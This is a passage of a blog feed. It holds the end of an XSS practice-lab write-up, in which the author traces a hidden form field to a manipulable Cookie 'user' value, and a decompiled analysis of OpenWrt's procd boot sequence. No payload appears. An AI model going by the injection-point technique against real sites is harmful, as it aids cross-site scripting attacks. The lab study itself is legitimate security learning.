class="string">&quot;t_cook&quot;</span>  value=<span class="string">&quot;call me maybe?&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>发现t_sort和t_cook可以通过GETS传参，但是t_cook的原理未知</p><p>BP抓包发现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=call+me+maybe%<span class="number">7F</span></span><br></pre></td></tr></table></figure><p>Cookie的user字段便是t_cook的来源</p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>看源码发现网站貌似是挂了的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSS学习&quot;&gt;&lt;a href=&quot;#XSS学习&quot; class=&quot;headerlink&quot; title=&quot;XSS学习&quot;&gt;&lt;/a&gt;XSS学习&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前</summary>
      
    
    
    
    <category term="Web安全" scheme="http://s1nec-1o.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web" scheme="http://s1nec-1o.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>openwrt路由器启动流程</title>
    <link href="http://s1nec-1o.github.io/2025/01/04/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/"/>
    <id>http://s1nec-1o.github.io/2025/01/04/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/</id>
    <published>2025-01-04T05:20:30.000Z</published>
    <updated>2025-01-04T05:49:33.928Z</updated>
    
    <content type="html"><![CDATA[<h1 id="openwrt路由器启动流程"><a href="#openwrt路由器启动流程" class="headerlink" title="openwrt路由器启动流程"></a>openwrt路由器启动流程</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>只做了大致流程的分析</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过&#x2F;etc&#x2F;rc.d下的链接执行**&#x2F;etc&#x2F;init.d**下的初始化服务，不过有的固件并没有init.d目录，因此还是得特殊情况特殊看待</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p><strong>&#x2F;sbin&#x2F;init-&gt;第一次&#x2F;sbin&#x2F;procd-&gt;&#x2F;sbin&#x2F;preinit-&gt;第二次&#x2F;sbin&#x2F;procd</strong></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h2 id="sbin-init"><a href="#sbin-init" class="headerlink" title="&#x2F;sbin&#x2F;init"></a>&#x2F;sbin&#x2F;init</h2><p>首先第一个启动的程序便是&#x2F;sbin&#x2F;init初始化程序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sigaction</span>(<span class="number">15</span>, &amp;asc_1244C, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(<span class="number">10</span>, &amp;asc_1244C, <span class="number">0</span>);</span><br><span class="line">  v3 = <span class="built_in">sigaction</span>(<span class="number">12</span>, &amp;asc_1244C, <span class="number">0</span>);</span><br><span class="line">  v4 = <span class="built_in">sub_9110</span>(v3);</span><br><span class="line">  <span class="built_in">sub_903C</span>(v4);</span><br><span class="line">  v5 = <span class="built_in">sub_9C04</span>(<span class="number">1</span>);</span><br><span class="line">  v6 = <span class="built_in">uloop_init</span>(v5);</span><br><span class="line">  v7 = <span class="built_in">sub_94D0</span>(v6);</span><br><span class="line">  <span class="built_in">uloop_run</span>(v7);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sub-9110"><a href="#sub-9110" class="headerlink" title="sub_9110"></a>sub_9110</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_9110</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">stat</span> v2; <span class="comment">// [sp+8h] [bp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">getpid</span>();</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">mount</span>(<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;proc&quot;</span>, <span class="number">0x400</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">mount</span>(<span class="string">&quot;sysfs&quot;</span>, <span class="string">&quot;/sys&quot;</span>, <span class="string">&quot;sysfs&quot;</span>, <span class="number">0x400</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">mount</span>(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;/tmp&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, <span class="number">0x406</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/tmp/run&quot;</span>, <span class="number">0x1FF</span>u);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/tmp/lock&quot;</span>, <span class="number">0x1FF</span>u);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/tmp/state&quot;</span>, <span class="number">0x1FF</span>u);</span><br><span class="line">    <span class="built_in">symlink</span>(<span class="string">&quot;/tmp&quot;</span>, <span class="string">&quot;/var&quot;</span>);</span><br><span class="line">    <span class="built_in">mount</span>(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;/dev&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, <span class="number">0x400</span>u, <span class="string">&quot;mode=0755,size=512K&quot;</span>);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/dev/shm&quot;</span>, <span class="number">0x1ED</span>u);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/dev/pts&quot;</span>, <span class="number">0x1ED</span>u);</span><br><span class="line">    <span class="built_in">mount</span>(<span class="string">&quot;devpts&quot;</span>, <span class="string">&quot;/dev/pts&quot;</span>, <span class="string">&quot;devpts&quot;</span>, <span class="number">0x400</span>u, <span class="string">&quot;mode=600&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_98F0</span>(<span class="string">&quot;*&quot;</span>, <span class="number">384</span>);</span><br><span class="line">    <span class="built_in">mknod</span>(<span class="string">&quot;/dev/null&quot;</span>, <span class="number">0x1B6</span>u, <span class="number">0x103</span>uLL);</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;PATH&quot;</span>, <span class="string">&quot;/bin:/sbin:/usr/bin:/usr/sbin&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">stat</span>(<span class="string">&quot;/dev/console&quot;</span>, &amp;v2) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to stat %s\n&quot;</span>, <span class="string">&quot;/dev/console&quot;</span>);</span><br><span class="line">      <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: Failed to stat %s\n&quot;</span>, <span class="string">&quot;/dev/console&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="built_in">open</span>(<span class="string">&quot;/dev/console&quot;</span>, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">        v1 = <span class="built_in">open</span>(<span class="string">&quot;/dev/null&quot;</span>, <span class="number">2</span>);</span><br><span class="line">      <span class="built_in">dup2</span>(v1, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">dup2</span>(v1, <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">dup2</span>(v1, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt; <span class="number">2</span> )</span><br><span class="line">        <span class="built_in">close</span>(v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Console is alive\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">fputs</span>(<span class="string">&quot;procd: Console is alive\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到要求当前程序的pid为1，在仿真时，或许可以直接把其patch掉，挂载多个文件系统，创建目录和符号链接，设置模式，大小和权限，之后调用sub_98F0函数</p><h4 id="sub-98F0"><a href="#sub-98F0" class="headerlink" title="sub_98F0"></a>sub_98F0</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_98F0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// r0</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// r4</span></span><br><span class="line">  _DWORD v8[<span class="number">7</span>]; <span class="comment">// [sp+4h] [bp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v8[<span class="number">0</span>] = a2;                                   <span class="comment">// 0x180</span></span><br><span class="line">  v8[<span class="number">1</span>] = a3;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">chdir</span>(<span class="string">&quot;/dev&quot;</span>) )                          <span class="comment">// 设置当前工作目录为/dev，失败返回1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(a1);                              <span class="comment">// *</span></span><br><span class="line">  v7 = <span class="built_in">malloc</span>(v6 + <span class="number">2</span>);</span><br><span class="line">  *v7 = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v7 + <span class="number">1</span>, a1);</span><br><span class="line">  v8[<span class="number">0</span>] = v7;                                   <span class="comment">// &amp;(**)</span></span><br><span class="line">  addrxx = (<span class="type">int</span>)v8;</span><br><span class="line">  dword_144A4 = <span class="number">1</span>;</span><br><span class="line">  dword_12460 = a2;</span><br><span class="line">  <span class="built_in">sub_9688</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sub_9688</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的sub_9688函数，是为了遍历指定目录，读取符号链接，匹配特定模式，并创建相应的设备节点。</p><ol><li><strong>参数为 0：</strong><ul><li>路径为 <code>/sys/dev/char</code>。</li><li>创建字符设备节点（<code>v14 = 0x2000</code>）。</li></ul></li><li><strong>参数为 1：</strong><ul><li>路径为 <code>&quot;/sys/dev/block&quot;</code>。</li><li>创建块设备节点（<code>v14 = 24576</code>，即 <code>0x6000</code>）。</li></ul></li></ol><h3 id="sub-903C"><a href="#sub-903C" class="headerlink" title="sub_903C"></a>sub_903C</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sub_903C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1016</span>]; <span class="comment">// [sp+8h] [bp-440h] BYREF</span></span><br><span class="line">  <span class="type">regex_t</span> v3; <span class="comment">// [sp+408h] [bp-40h] BYREF</span></span><br><span class="line">  <span class="type">regmatch_t</span> v4; <span class="comment">// [sp+428h] [bp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+430h] [bp-18h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+434h] [bp-14h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">open</span>(<span class="string">&quot;/proc/cmdline&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    buf[<span class="built_in">read</span>(v0, buf, <span class="number">0x3FF</span>u)] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">close</span>(v1);</span><br><span class="line">    <span class="built_in">regcomp</span>(&amp;v3, <span class="string">&quot;init_debug=([0-9]+)&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">regexec</span>(&amp;v3, buf, <span class="number">2u</span>, &amp;v4, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      buf[v6] = <span class="number">0</span>;</span><br><span class="line">      dword_12474 = <span class="built_in">atoi</span>(&amp;buf[v5]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">regfree</span>(&amp;v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此函数的作用是解析内核命令行参数，提取 <code>init_debug</code> 的值，并将其存储在全局变量 <code>dword_12474</code> 中</p><h3 id="sub-9C04"><a href="#sub-9C04" class="headerlink" title="sub_9C04"></a>sub_9C04</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *__fastcall <span class="title">sub_9C04</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r0</span></span><br><span class="line">  FILE *v7; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">getenv</span>(<span class="string">&quot;WDTFD&quot;</span>);</span><br><span class="line">  v3 = result;</span><br><span class="line">  <span class="keyword">if</span> ( dword_12464 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_144B4 = (<span class="type">int</span>)sub_9980;</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)dword_12474 &gt; <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Watchdog handover: fd=%s\n&quot;</span>, result);</span><br><span class="line">        <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Watchdog handover: fd=%s\n&quot;</span>, <span class="string">&quot;watchdog_init&quot;</span>, <span class="number">103</span>, v3);</span><br><span class="line">      &#125;</span><br><span class="line">      dword_12464 = <span class="built_in">atoi</span>(v3);</span><br><span class="line">      result = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">unsetenv</span>(<span class="string">&quot;WDTFD&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      dword_12464 = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = dword_12464;</span><br><span class="line">    <span class="keyword">if</span> ( dword_12464 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = <span class="built_in">fcntl</span>(dword_12464, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">fcntl</span>(v4, <span class="number">2</span>, v5 | <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- watchdog -\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;procd: - watchdog -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">sub_9A84</span>(<span class="number">30</span>);</span><br><span class="line">      result = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_9980</span>(&amp;unk_144A8);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)dword_12474 &gt; <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="built_in">sub_9A84</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Opened watchdog with timeout %ds\n&quot;</span>, v6);</span><br><span class="line">        v7 = (FILE *)stderr;</span><br><span class="line">        v8 = <span class="built_in">sub_9A84</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">fprintf</span>(v7, <span class="string">&quot;procd: %s(%d): Opened watchdog with timeout %ds\n&quot;</span>, <span class="string">&quot;watchdog_init&quot;</span>, <span class="number">120</span>, v8);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化看门狗计时器</p><h3 id="sub-94D0"><a href="#sub-94D0" class="headerlink" title="sub_94D0"></a>sub_94D0</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_94D0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">__pid_t</span> v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *file[<span class="number">4</span>]; <span class="comment">// [sp+Ch] [bp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v6[<span class="number">11</span>]; <span class="comment">// [sp+1Ch] [bp-2Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="string">&quot;/etc/preinit&quot;</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  file[<span class="number">0</span>] = <span class="string">&quot;/sbin/procd&quot;</span>;</span><br><span class="line">  file[<span class="number">1</span>] = <span class="string">&quot;-h&quot;</span>;</span><br><span class="line">  file[<span class="number">2</span>] = <span class="string">&quot;/etc/hotplug-preinit.json&quot;</span>;</span><br><span class="line">  file[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- preinit -\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fputs</span>(<span class="string">&quot;procd: - preinit -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">  dword_12484 = (<span class="type">int</span>)sub_9344;</span><br><span class="line">  v0 = fork();</span><br><span class="line">  dword_12488 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )                                    <span class="comment">// 子</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">execvp</span>(file[<span class="number">0</span>], file);</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start plugd\n&quot;</span>);</span><br><span class="line">    v1 = &amp;byte_9F8F;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start new plugd instance\n&quot;</span>);</span><br><span class="line">    v2 = byte_9FAD;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">fputs</span>(v2, (FILE *)stderr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">uloop_process_add</span>(&amp;unk_12478);</span><br><span class="line">  <span class="built_in">setenv</span>(<span class="string">&quot;PREINIT&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  dword_12498 = (<span class="type">int</span>)sub_9350;</span><br><span class="line">  v3 = fork();</span><br><span class="line">  dword_1249C = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">execvp</span>(v6[<span class="number">0</span>], v6);</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start preinit\n&quot;</span>);</span><br><span class="line">    v1 = <span class="string">&quot;procd: Failed to start preinit\n&quot;</span>;</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="built_in">fputs</span>(v1, (FILE *)stderr);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start new preinit instance\n&quot;</span>);</span><br><span class="line">    v2 = <span class="string">&quot;procd: Failed to start new preinit instance\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">fputs</span>(v2, (FILE *)stderr);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="built_in">uloop_process_add</span>(&amp;unk_1248C);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)dword_12474 &gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Launched preinit instance, pid=%d\n&quot;</span>, dword_1249C);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Launched preinit instance, pid=%d\n&quot;</span>, <span class="string">&quot;preinit&quot;</span>, <span class="number">120</span>, dword_1249C);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先fork运行&#x2F;sbin&#x2F;procd，以-h &#x2F;etc&#x2F;hotplug-preinit.json作为参数，之后uloop_process_add(&amp;unk_12478);， setenv(“PREINIT”, “1”, 1);设置preinit为1作为flag，之后fork运行&#x2F;bin&#x2F;sh，以&#x2F;etc&#x2F;preinit作为参数</p><blockquote><p><code>execvp</code> 会加载新的程序到当前进程的地址空间，覆盖原有的代码、数据和堆栈，因此紧跟execvp后面的便是错误的输出</p></blockquote><blockquote><p>uloop_process 是 Libubox 